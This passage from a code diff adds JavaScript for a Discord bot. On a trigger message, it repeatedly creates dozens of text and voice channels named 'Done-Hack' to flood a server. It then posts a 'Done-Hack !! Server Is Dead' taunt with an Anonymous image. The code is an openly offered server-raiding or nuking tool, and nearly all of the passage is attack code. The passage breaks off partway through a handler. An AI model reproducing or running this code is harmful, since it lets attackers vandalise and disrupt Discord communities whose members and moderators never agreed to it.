+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+
+//هنا الرسايل تم تهكيرك وكذا
+
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
